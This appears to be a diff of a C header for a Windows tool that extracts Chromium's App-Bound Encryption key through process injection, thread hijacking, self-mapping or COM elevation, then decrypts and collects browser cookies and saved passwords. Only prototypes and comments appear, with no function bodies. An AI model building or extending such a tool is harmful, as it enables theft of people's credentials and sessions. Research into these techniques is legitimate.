@@ -56,24 +56,18 @@
 
 typedef enum _ABE_METHOD { MethodDrop, MethodInject, MethodHijack, MethodElevate, MethodMax } ABE_METHOD;
 
-/* sample-side data the generic Browser module must not know about */
+/* ABE private data per browser type, indexed by NET_BROWSER_TYPE; the Browser
+   module only provides the identity, it knows nothing about these details */
 typedef struct _ABE_BROWSER
 {
-    PCWSTR Vendor;      /* matches Net_BrowserEnumerate output */
     PCWSTR CngKey;      /* persisted AES key in the SYSTEM profile KSP store (V3) */
     CLSID Clsid;
     IID Iid;
     ULONG DecryptSlot;
 } ABE_BROWSER;
 
-#define ABE_BROWSER_COUNT   (sizeof(AbeBrowsers) / sizeof(AbeBrowsers[0]))
-
-extern const ABE_BROWSER AbeBrowsers[2];
+extern const ABE_BROWSER AbeBrowsers[NetBrowserMax];
 extern const PCWSTR AbeMethodNames[MethodMax];
-
-const ABE_BROWSER*
-AbeFindBrowserEntry(
-    _In_z_ PCWSTR Vendor);
 
 /*** worker result ***/
 
@@ -91,8 +85,10 @@ typedef struct _ABE_RESULT
     WCHAR Status[4096];
     PABE_RECORD Cookies;
     ULONG CookieCount;
+    ULONG CookieCapacity;
     PABE_RECORD Passwords;
     ULONG PasswordCount;
+    ULONG PasswordCapacity;
 } ABE_RESULT, *PABE_RESULT;
 
 /* running log of the worker, also used for the final status text */
@@ -103,13 +99,25 @@ AbeLog(
     _In_z_ _Printf_format_string_ PCWSTR Format,
     ...);
 
-/* reads the whole file into a caller buffer */
-NTSTATUS
-AbeReadWholeFile(
-    _In_ PCWSTR Path,
-    _Out_writes_bytes_(BufferSize) PVOID Buffer,
-    _In_ ULONG BufferSize,
-    _Out_opt_ PULONG Size);
+/* appends "!!! <Name> KEY: <hex> !!!" in one shot */
+VOID
+AbeLogKey(
+    _In_z_ PCWSTR Name,
+    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key);
+
+/* formats a key as 64 hex digits plus the terminator */
+VOID
+AbeFormatKeyHex(
+    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key,
+    _Out_writes_(ABE_KEY_SIZE * 2 + 1) PSTR Text);
+
+/* creates the browser process with the given creation flags (no extra frills) */
+_Success_(return)
+BOOL
+AbeCreateBrowserProcess(
+    _In_z_ PCWSTR ExePath,
+    _In_ DWORD CreationFlags,
+    _Out_ LPPROCESS_INFORMATION ProcessInformation);
 
 /*** payload shared with the in-browser payload (Payload.c) ***/
 
@@ -117,7 +125,7 @@ AbeReadWholeFile(
 #pragma pack(push, 1)
 typedef struct _ABE_REQUEST
 {
-    ULONG BrowserIndex;
+    NET_BROWSER_TYPE BrowserType;
     ULONG LocalStateLength;
     BYTE LocalState[ABE_LOCAL_STATE_MAX];
 } ABE_REQUEST, *PABE_REQUEST;
@@ -128,10 +136,10 @@ extern volatile LONG g_Code;                /* payload result, 0 or HRESULT */
 extern volatile BYTE g_Key[ABE_KEY_SIZE];   /* the v20 key */
 extern volatile ABE_REQUEST g_Request;
 
+_Success_(return)
 BOOL
 AbePrepareRequest(
-    _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex);
+    _In_ const NET_BROWSER_INFO* Browser);
 
 /* COM payload: runs inside the browser process (Hijack initial thread /
    Inject remote thread / Drop child in-browser-directory process) */
@@ -147,6 +155,7 @@ AbeInjectEntry(LPVOID Param);
 
 /*** self-map (SelfMap.c) ***/
 
+_Success_(return)
 BOOL
 AbeMapSelf(
     _In_ HANDLE Process,
@@ -162,36 +171,36 @@ AbeWaitRemoteResult(
 
 /*** methods ***/
 
+_Success_(return)
 BOOL
 AbeGetKeyHijack(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);
 
+_Success_(return)
 BOOL
 AbeGetKeyInject(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);
 
+_Success_(return)
 BOOL
 AbeGetKeyDrop(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);
 
 /* Drop child: runs from the browser directory, reports the key on stdout */
+_Success_(return)
 BOOL
 AbeDropChild(
-    _In_ const NET_BROWSER_INFO* Browser,
-    _In_ ULONG BrowserIndex);
+    _In_ const NET_BROWSER_INFO* Browser);
 
 /* on success EnvelopeVersion (optional) receives the private envelope
    version: 1, 2 or 3 (0 when the payload is a raw key, e.g. legacy Edge) */
+_Success_(return)
 BOOL
 AbeGetKeyElevate(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ const ABE_BROWSER* Entry,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key,
     _Out_opt_ PULONG EnvelopeVersion);
 
@@ -225,15 +234,17 @@ AbeGcmDecrypt(
 
 /* reads os_crypt.<Field> of Local State, base64-decodes it into Blob
    (APPB/DPAPI prefix kept) */
+_Success_(return)
 BOOL
 AbeReadOsCryptBlob(
     _In_z_ PCWSTR UserDataDir,
     _In_z_ PCWSTR Field,
     _Out_writes_bytes_(BlobSize) PBYTE Blob,
     _In_ ULONG BlobSize,
-    _Inout_ PDWORD BlobLength);
+    _Inout_ PULONG BlobLength);
 
 /* v10 key (user DPAPI, always available) */
+_Success_(return)
 BOOL
 AbeGetV10Key(
     _In_ const NET_BROWSER_INFO* Browser,
@@ -258,9 +269,8 @@ AbeCollectRecords(
 typedef struct _ABE_JOB
 {
     NET_BROWSER_INFO Browser;
-    ABE_BROWSER Entry;
-    ULONG BrowserIndex;
     ABE_METHOD Method;
+    PABE_RESULT Result;
     WCHAR Profile[MAX_PATH];
 } ABE_JOB, *PABE_JOB;
 
